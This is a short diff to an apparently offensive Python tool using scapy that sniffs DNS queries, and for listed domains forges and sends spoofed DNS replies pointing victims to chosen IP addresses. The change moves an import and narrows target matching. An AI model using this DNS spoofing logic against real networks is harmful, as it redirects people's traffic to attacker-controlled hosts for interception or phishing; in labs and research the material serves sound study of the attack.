@@ -8,7 +8,8 @@ from tabnanny import verbose
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, IP, UDP
 
-from utils import get_local_ip, thread_with_trace
+from utils import thread_with_trace
+from networking_functions import get_local_ip
 
 local_ip = get_local_ip()
 
@@ -35,7 +36,7 @@ def process_dns_packet(packet_to_process, target):
     if current_domain in domains:
         print(packet_to_process)
         ip = hosts_dict[current_domain]
-        if target is None or packet_to_process[IP].src == target or target=="all":
+        if target is None or packet_to_process[IP].src == target:
             forged_packet = forge_packet(packet_to_process, ip)
             send(forged_packet, verbose=0)
             print(
